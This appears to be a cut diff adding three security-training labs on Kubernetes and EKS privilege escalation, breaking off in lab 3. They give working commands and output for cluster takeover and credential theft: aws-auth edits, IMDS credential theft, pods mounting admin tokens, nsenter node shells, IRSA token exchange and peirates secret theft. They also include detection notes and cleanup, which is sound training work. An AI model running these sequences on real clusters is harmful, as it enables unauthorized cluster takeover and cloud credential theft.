@@ -1,0 +1,888 @@
+<!-- M15: Kubernetes RBAC & EKS Privilege Escalation — Expert Tier Labs -->
+<!-- DISCLAIMER: This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test. -->
+
+<div class="lab-walkthrough-content" id="M15-L01-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Enumerate Kubernetes RBAC policies to map cluster roles, role bindings, and identify privilege escalation paths from a compromised pod.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Shell access to a running Kubernetes pod with a mounted service account token</li>
+      <li><code>kubectl</code> available inside the pod, or <code>curl</code> + <code>jq</code> to query the API directly</li>
+      <li>Basic understanding of Kubernetes RBAC: ClusterRole, RoleBinding, ServiceAccount</li>
+      <li>For EKS-specific escalation: AWS CLI configured with credentials of a compromised IAM principal</li>
+    </ul>
+  </div>
+
+  <div class="warning">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized testing only.</strong> These enumeration and escalation techniques require a test EKS cluster where you have explicit written permission to perform offensive security work.
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Check the permissions of your current service account. This is the first step in any Kubernetes post-exploitation — understanding what you can do.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl auth can-i --list</div>
+            <div class="terminal-output">Resources                                       Non-Resource URLs   Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
+pods                                            []                  []               [get list watch create delete]
+pods/exec                                       []                  []               [create]
+pods/log                                        []                  []               [get]
+services                                        []                  []               [get list]
+secrets                                         []                  []               [get list]
+configmaps                                      []                  []               [get list]
+serviceaccounts                                 []                  []               [get list]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">List cluster roles to find high-privilege roles that could be targeted for escalation. Look for <code>admin</code>, <code>cluster-admin</code>, or custom roles with broad permissions.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get clusterroles -o name | head -20</div>
+            <div class="terminal-output">clusterrole.rbac.authorization.k8s.io/admin
+clusterrole.rbac.authorization.k8s.io/cluster-admin
+clusterrole.rbac.authorization.k8s.io/edit
+clusterrole.rbac.authorization.k8s.io/eks:addon-manager
+clusterrole.rbac.authorization.k8s.io/eks:node-bootstrapper
+clusterrole.rbac.authorization.k8s.io/monitoring-full-access
+clusterrole.rbac.authorization.k8s.io/platform-deployer
+clusterrole.rbac.authorization.k8s.io/system:node
+clusterrole.rbac.authorization.k8s.io/view</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">List all role bindings and cluster role bindings to map which identities (users, groups, service accounts) have which roles.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get rolebindings,clusterrolebindings -A --no-headers | head -20</div>
+            <div class="terminal-output">default       rolebinding/webapp-binding                  ClusterRole/edit            15d
+default       rolebinding/api-binding                    ClusterRole/edit            15d
+default       rolebinding/admin-tools-binding            ClusterRole/admin           15d
+kube-system   rolebinding/aws-node-binding               ClusterRole/aws-node        30d
+              clusterrolebinding/cluster-admin-binding    ClusterRole/cluster-admin   30d
+              clusterrolebinding/platform-deployer-bind   ClusterRole/platform-deployer   15d</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Describe the most interesting roles to understand their exact permissions. Focus on roles with wildcard verbs or access to sensitive resource types.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl describe clusterrole admin</div>
+            <div class="terminal-output">Name:         admin
+PolicyRule:
+  Resources                                Non-Resource URLs  Resource Names  Verbs
+  ---------                                -----------------  --------------  -----
+  rolebindings.rbac.authorization.k8s.io   []                 []              [create delete get list patch update watch]
+  roles.rbac.authorization.k8s.io          []                 []              [create delete get list patch update watch]
+  configmaps                               []                 []              [create delete get list patch update watch]
+  pods                                     []                 []              [create delete get list patch update watch]
+  secrets                                  []                 []              [create delete get list patch update watch]
+  deployments.apps                         []                 []              [create delete get list patch update watch]
+  pods/exec                                []                 []              [create]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Identify escalation paths by looking for dangerous permission combinations: create pods, create secrets, impersonate users, or bind to cluster-admin.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# echo "=== ESCALATION PATH ANALYSIS ==="
+kubectl auth can-i create pods         && echo "[CRITICAL] Can CREATE PODS"
+kubectl auth can-i get secrets         && echo "[CRITICAL] Can READ SECRETS"
+kubectl auth can-i create pods/exec    && echo "[HIGH] Can EXEC into pods"
+kubectl auth can-i create rolebindings && echo "[HIGH] Can CREATE ROLEBINDINGS"
+kubectl auth can-i impersonate users   && echo "[HIGH] Can IMPERSONATE USERS"</div>
+            <div class="terminal-output">=== ESCALATION PATH ANALYSIS ===
+yes
+[CRITICAL] Can CREATE PODS
+yes
+[CRITICAL] Can READ SECRETS
+yes
+[HIGH] Can EXEC into pods
+no
+no</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">6</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>EKS-specific: Scan the aws-auth ConfigMap for privilege escalation paths.</strong> In EKS, the <code>aws-auth</code> ConfigMap maps IAM users and roles to Kubernetes RBAC groups. If your IAM user is listed, or if you can modify it, you may gain cluster-admin.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# # Read current aws-auth ConfigMap
+kubectl get configmap aws-auth -n kube-system -o yaml</div>
+            <div class="terminal-output">apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: aws-auth
+  namespace: kube-system
+data:
+  mapRoles: |
+    - rolearn: arn:aws:iam::123456789012:role/eks-node-group-role
+      username: system:node:{{EC2PrivateDNSName}}
+      groups:
+        - system:bootstrappers
+        - system:nodes
+  mapUsers: |
+    - userarn: arn:aws:iam::123456789012:user/cluster-admin-user
+      username: cluster-admin-user
+      groups:
+        - system:masters</div>
+            <div class="terminal-cmd">root@compromised-pod:/# # If you have write access to aws-auth, add your attacker IAM identity to system:masters
+# This is the most common EKS privilege escalation path
+kubectl edit configmap aws-auth -n kube-system</div>
+            <div class="terminal-output"># In the editor, add under mapUsers:
+#   - userarn: arn:aws:iam::123456789012:user/attacker
+#     username: attacker
+#     groups:
+#       - system:masters
+# After saving, authenticate with the attacker IAM user for cluster-admin access</div>
+            <div class="terminal-cmd">root@compromised-pod:/# # Verify new access from attacker's perspective
+aws eks update-kubeconfig --name production-cluster --region us-east-1 \
+  --profile attacker
+kubectl auth can-i "*" "*"</div>
+            <div class="terminal-output">yes</div>
+          </div>
+        </div>
+        <div class="warning"><strong>Detection trigger:</strong> <code>update</code> on ConfigMap <code>aws-auth</code> in <code>kube-system</code> namespace is a high-fidelity alert — this ConfigMap has very few legitimate reasons to be modified outside of planned node group operations. CloudTrail will also log the Kubernetes API call.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">7</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>EKS-specific: Abuse node IMDS from an unrestricted pod.</strong> If no network policy blocks pod-to-169.254.169.254, any pod can steal the EKS node's IAM role credentials directly from the metadata service — no container escape needed.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# # Attempt IMDS access from inside a pod (no network policy = reachable)
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/</div>
+            <div class="terminal-output">eks-node-group-role</div>
+            <div class="terminal-cmd">root@compromised-pod:/# # Retrieve node role credentials
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-group-role | \
+  jq '{AccessKeyId, Expiration}'</div>
+            <div class="terminal-output">{
+  "AccessKeyId": "ASIAIOSFODNN7NODEROL",
+  "Expiration": "2026-04-02T22:00:00Z"
+}</div>
+            <div class="terminal-cmd">root@compromised-pod:/# # Use Calico/Cilium network policy or host-based iptables to block pods from reaching 169.254.169.254
+# IMDSv2 hop limit=1 (TTL=1) also prevents cross-namespace abuse on some setups</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">auth can-i --list</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Enumerate Roles</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">aws-auth ConfigMap</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">system:masters</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>Alert on any <code>update</code> or <code>patch</code> operations on the <code>aws-auth</code> ConfigMap in <code>kube-system</code> — near-zero false positive rate</li>
+      <li>Alert on unexpected <code>kubectl edit</code> API calls (<code>PATCH</code> verb) from service account identities that normally only read resources</li>
+      <li>CloudTrail: <code>GetCallerIdentity</code> calls from EC2 instances using node role credentials but with user-agent strings inconsistent with <code>aws-node</code> or <code>kubelet</code></li>
+      <li>Network policy violations: unexpected traffic to <code>169.254.169.254</code> from application pod CIDRs</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1078.001</strong> — Valid Accounts: Default Accounts (aws-auth ConfigMap maps to system:masters)</li>
+      <li><strong>T1613</strong> — Container and Resource Discovery (kubectl enumeration)</li>
+      <li><strong>T1552.005</strong> — Unsecured Credentials: Cloud Instance Metadata API (node IMDS from pod)</li>
+      <li><strong>T1548.005</strong> — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access (aws-auth modification)</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Remove any attacker identity added to <code>aws-auth</code>: <code>kubectl edit configmap aws-auth -n kube-system</code></li>
+      <li>Rotate node IAM credentials if IMDS was accessed from a pod during the lab</li>
+      <li>Review and audit all RBAC bindings after the exercise</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> The most dangerous K8s RBAC permissions for privilege escalation: <code>create pods</code>, <code>create pods/exec</code>, <code>get secrets</code>, <code>create/update rolebindings</code>, <code>impersonate</code>, and <code>escalate</code>. In EKS, also treat <code>update</code> on <code>aws-auth</code> as equivalent to cluster-admin grant.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M15-L02-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Escalate from a low-privilege service account with pod creation rights to cluster-admin by creating a pod that mounts a high-privilege service account token. Also cover the correct node shell technique using <code>kubectl debug</code>.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Service account with <code>create pods</code> permission in at least one namespace</li>
+      <li>At least one high-privilege service account (e.g., <code>admin-sa</code>) present in the same namespace</li>
+      <li><code>kubectl</code> configured with the low-privilege service account token</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Verify the current service account can create pods. This single permission is sufficient for full cluster compromise if any admin-level service accounts exist.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl auth can-i create pods</div>
+            <div class="terminal-output">yes</div>
+            <div class="terminal-cmd">root@compromised-pod:/# # Find high-privilege service accounts
+kubectl get sa -o json | jq '.items[] | select(.metadata.name | test("admin|deploy|cluster")) | .metadata.name'</div>
+            <div class="terminal-output">"admin-sa"
+"platform-deployer-sa"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Create a pod YAML spec that uses the admin service account. The <code>automountServiceAccountToken: true</code> ensures the admin token is projected into the pod.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# cat > /tmp/escalation-pod.yaml &lt;&lt;'EOF'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escalation-pod
+  namespace: default
+  labels:
+    app: debug-tools
+spec:
+  serviceAccountName: admin-sa
+  automountServiceAccountToken: true
+  containers:
+  - name: escalate
+    image: ubuntu:22.04
+    command: ["/bin/bash", "-c", "apt-get update -qq && apt-get install -y -qq curl jq && sleep infinity"]
+    securityContext:
+      runAsUser: 0
+  restartPolicy: Never
+EOF</div>
+            <div class="terminal-output"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Create the escalation pod. Kubernetes schedules it with the admin service account's token automatically mounted.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl apply -f /tmp/escalation-pod.yaml</div>
+            <div class="terminal-output">pod/escalation-pod created</div>
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get pod escalation-pod -w</div>
+            <div class="terminal-output">NAME             READY   STATUS              RESTARTS   AGE
+escalation-pod   0/1     ContainerCreating   0          3s
+escalation-pod   1/1     Running             0          8s</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Exec into the escalation pod and read the admin service account token. Decode the JWT payload to confirm the service account identity.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl exec -it escalation-pod -- /bin/bash</div>
+            <div class="terminal-output">root@escalation-pod:/#</div>
+            <div class="terminal-cmd">root@escalation-pod:/# ADMIN_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+echo "$ADMIN_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{sub,iss,"kubernetes.io"}'</div>
+            <div class="terminal-output">{
+    "sub": "system:serviceaccount:default:admin-sa",
+    "iss": "https://oidc.eks.us-east-1.amazonaws.com/id/ABCDEF1234567890",
+    "kubernetes.io": {
+        "namespace": "default",
+        "serviceaccount": {
+            "name": "admin-sa",
+            "uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+        }
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Use the admin token to verify cluster-admin privileges. You now have full control over the entire Kubernetes cluster.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@escalation-pod:/# APISERVER=https://kubernetes.default.svc
+curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+    -H "Authorization: Bearer $ADMIN_TOKEN" \
+    $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
+    -X POST -H "Content-Type: application/json" \
+    -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"*","resource":"*"}}}' | jq '.status'</div>
+            <div class="terminal-output">{
+    "allowed": true,
+    "reason": "RBAC: allowed by ClusterRoleBinding \"admin-sa-cluster-admin\" of ClusterRole \"cluster-admin\" to ServiceAccount \"admin-sa/default\""
+}</div>
+            <div class="terminal-cmd">root@escalation-pod:/# # Full cluster-admin confirmed — list all namespaces
+curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+    -H "Authorization: Bearer $ADMIN_TOKEN" \
+    $APISERVER/api/v1/namespaces | jq '.items[].metadata.name'</div>
+            <div class="terminal-output">"default"
+"kube-node-lease"
+"kube-public"
+"kube-system"
+"monitoring"
+"production"
+"staging"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">6</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Node shell technique (correct approach).</strong> The <code>kubectl taint</code> command alone does not grant access to a node. To get an interactive shell on an EKS node, use <code>kubectl debug node/</code> which deploys a privileged pod on the target node using the node's host namespaces.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get nodes</div>
+            <div class="terminal-output">NAME                                       STATUS   ROLES    AGE   VERSION
+ip-10-0-1-10.ec2.internal                 Ready    &lt;none&gt;   30d   v1.29.0-eks-a1b2c3
+ip-10-0-2-20.ec2.internal                 Ready    &lt;none&gt;   30d   v1.29.0-eks-a1b2c3
+ip-10-0-3-30.ec2.internal                 Ready    &lt;none&gt;   30d   v1.29.0-eks-a1b2c3</div>
+            <div class="terminal-cmd">root@compromised-pod:/# # Get an interactive node shell on a specific node (requires cluster-admin or node/debug permission)
+kubectl debug node/ip-10-0-1-10.ec2.internal -it --image=ubuntu</div>
+            <div class="terminal-output">Creating debugging pod node-debugger-ip-10-0-1-10.ec2.internal-xxxxx with container debugger on node ip-10-0-1-10.ec2.internal.
+If you don't see a command prompt, try pressing enter.
+root@ip-10-0-1-10:/# # Shell is on the NODE — /host is mounted to the node's root filesystem</div>
+            <div class="terminal-cmd">root@ip-10-0-1-10:/# # Use nsenter to fully enter host namespaces from the debug pod
+nsenter -t 1 -m -u -i -n -p -- bash</div>
+            <div class="terminal-output">root@ip-10-0-1-10.ec2.internal:/# # Full node root shell
+crictl ps</div>
+          </div>
+        </div>
+        <div class="note"><strong>Note:</strong> <code>kubectl taint nodes</code> affects pod scheduling (eviction), not access. It cannot be used by itself to gain shell access to a node. Use <code>kubectl debug node/</code> or deploy a pod with <code>nodeName</code>, <code>hostPID: true</code>, and <code>privileged: true</code> instead.</div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Low-priv SA (create pods)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Pod with admin SA</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Exec in</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Cluster-admin</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>Alert on pod creation events where <code>serviceAccountName</code> differs from the calling identity's own service account</li>
+      <li>Alert on <code>exec</code> into pods with high-privilege service accounts (Kubernetes audit: <code>create pods/exec</code>)</li>
+      <li>Alert on <code>kubectl debug node/</code> usage — this creates a privileged debug pod (audit log event: <code>create pods</code> with <code>hostPID: true</code>)</li>
+      <li>Falco rule: <code>launch_privileged_container</code> triggered when the debug pod starts</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1078.001</strong> — Valid Accounts: Default Accounts (service account token reuse)</li>
+      <li><strong>T1548.005</strong> — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access</li>
+      <li><strong>T1613</strong> — Container and Resource Discovery</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Delete escalation pod: <code>kubectl delete pod escalation-pod</code></li>
+      <li>Delete any debug pods: <code>kubectl delete pod -l app=node-debugger</code></li>
+      <li>Review and remove any unintended ClusterRoleBindings created during the lab</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> Pod creation is equivalent to cluster-admin if any high-privilege service accounts exist. Restrict pod creation with OPA Gatekeeper or Kyverno policies that prevent pods from using service accounts other than their own namespace's default SA.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M15-L03-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Abuse node tainting to understand DaemonSet scheduling behavior, and steal the AWS VPC CNI IAM role credentials from the <code>aws-node</code> DaemonSet via IRSA token theft.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Service account with <code>get/exec</code> permissions on pods in <code>kube-system</code>, or ability to create pods there</li>
+      <li>AWS CLI available to exchange the IRSA JWT for IAM credentials</li>
+      <li>Understanding of EKS node groups and DaemonSet toleration semantics</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Identify DaemonSets running in kube-system. The <code>aws-node</code> DaemonSet manages VPC networking and has an IAM role with significant AWS permissions.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get daemonsets -n kube-system</div>
+            <div class="terminal-output">NAME         DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE
+aws-node     3         3         3       3            3           &lt;none&gt;          30d
+kube-proxy   3         3         3       3            3           &lt;none&gt;          30d</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Examine the aws-node DaemonSet to find its service account and associated IAM role. This role typically has permissions for ENI management and IP allocation.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get daemonset aws-node -n kube-system -o json | \
+    jq '{sa: .spec.template.spec.serviceAccountName, tolerations: .spec.template.spec.tolerations}'</div>
+            <div class="terminal-output">{
+    "sa": "aws-node",
+    "tolerations": [{"operator": "Exists"}]
+}</div>
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get sa aws-node -n kube-system -o json | \
+    jq '.metadata.annotations'</div>
+            <div class="terminal-output">{
+    "eks.amazonaws.com/role-arn": "arn:aws:iam::123456789012:role/AmazonEKS_CNI_Role"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Understanding node taint behavior: <code>kubectl taint nodes</code> evicts regular pods but DaemonSets with <code>tolerations: [{operator: Exists}]</code> tolerate ALL taints and remain. This is an important distinction — tainting alone does not grant node access.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get nodes</div>
+            <div class="terminal-output">NAME                                       STATUS   ROLES    AGE   VERSION
+ip-10-0-1-10.ec2.internal                 Ready    &lt;none&gt;   30d   v1.29.0-eks-a1b2c3
+ip-10-0-2-20.ec2.internal                 Ready    &lt;none&gt;   30d   v1.29.0-eks-a1b2c3
+ip-10-0-3-30.ec2.internal                 Ready    &lt;none&gt;   30d   v1.29.0-eks-a1b2c3</div>
+            <div class="terminal-cmd">root@compromised-pod:/# # Taint a node — evicts regular pods but NOT DaemonSets
+kubectl taint nodes ip-10-0-1-10.ec2.internal key=value:NoSchedule</div>
+            <div class="terminal-output">node/ip-10-0-1-10.ec2.internal tainted</div>
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl get pods -A -o wide --field-selector spec.nodeName=ip-10-0-1-10.ec2.internal</div>
+            <div class="terminal-output">NAMESPACE     NAME                    READY   STATUS    NODE
+kube-system   aws-node-a1b2c          1/1     Running   ip-10-0-1-10.ec2.internal
+kube-system   kube-proxy-c3d4e        1/1     Running   ip-10-0-1-10.ec2.internal
+# Regular pods evicted — only system DaemonSets remain (they tolerate all taints)</div>
+          </div>
+        </div>
+        <div class="note"><strong>Note:</strong> The taint itself does not grant access to the aws-node pod's credentials. You still need <code>exec</code> permission on pods in <code>kube-system</code> to steal the IRSA token — covered in the next step.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Access the aws-node pod to steal its IRSA token, which grants the VPC CNI IAM role. This requires <code>pods/exec</code> permission in <code>kube-system</code>.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@compromised-pod:/# kubectl exec -it aws-node-a1b2c -n kube-system -c aws-node -- \
+    cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token | \
+    cut -d. -f2 | base64 -d 2>/dev/null | jq '{sub,iss,aud}'</div>
+            <div class="terminal-output">{
+    "sub": "system:serviceaccount:kube-system:aws-node",
+    "iss": "https://oidc.eks.us-east-1.amazonaws.com/id/ABCDEF1234567890",
+    "aud": ["sts.amazonaws.com"]
+}</div>
+            <div class="terminal-cmd">root@compromised-pod:/# # Exchange IRSA JWT for AWS credentials
+TOKEN=$(kubectl exec aws-node-a1b2c -n kube-system -c aws-node -- \
+    cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
+aws sts assume-role-with-web-identity \
+    --role-arn arn:aws:iam::123456789012:role/AmazonEKS_CNI_Role \
+    --role-session-name cni-theft \
+    --web-identity-token "$TOKEN" --query 'Credentials.AccessKeyId'</div>
+            <div class="terminal-output">"ASIAIOSFODNN7CNIROLE"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Automated scanning with kube-hunter and peirates.</strong> Use dedicated Kubernetes attack tools to accelerate enumeration and identify escalation paths.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">root@attacker:/# # kube-hunter — passive reconnaissance from outside the cluster
+kube-hunter --remote ABCDEF1234567890.gr7.us-east-1.eks.amazonaws.com</div>
+            <div class="terminal-output">+----------+----------------------+----------------------+
+| SEVERITY | VULNERABILITY        | DESCRIPTION          |
++----------+----------------------+----------------------+
+| high     | K8s Version Disclosure | Kubernetes v1.29.0  |
+| medium   | Anonymous Auth       | API server permits   |
+|          |                      | anonymous access     |
+| low      | Exposed Dashboard    | K8s dashboard found  |
++----------+----------------------+----------------------+</div>
+            <div class="terminal-cmd">root@attacker:/# # peirates — interactive post-exploitation framework from inside a pod
+# Download: https://github.com/inguardians/peirates
+./peirates</div>
+            <div class="terminal-output">
+                _____ _
+ _ __  ___(_)_ __ __ _| |_ ___  ___
+| '_ \/ _ \ | '__/ _' | __/ _ \/ __|
+| |_) \  __/ | | | (_| | ||  __/\__ \
+| .__/ \___|_|_|  \__,_|\__\___||___/
+|_|
+[+] Loaded service account: /var/run/secrets/kubernetes.io/serviceaccount/token
+[+] API Server: https://kubernetes.default.svc
+[+] Namespace: default
+[peirates] > list-secrets
+[+] Found 4 secrets in namespace default
+[peirates] > steal-secrets
+...</div>
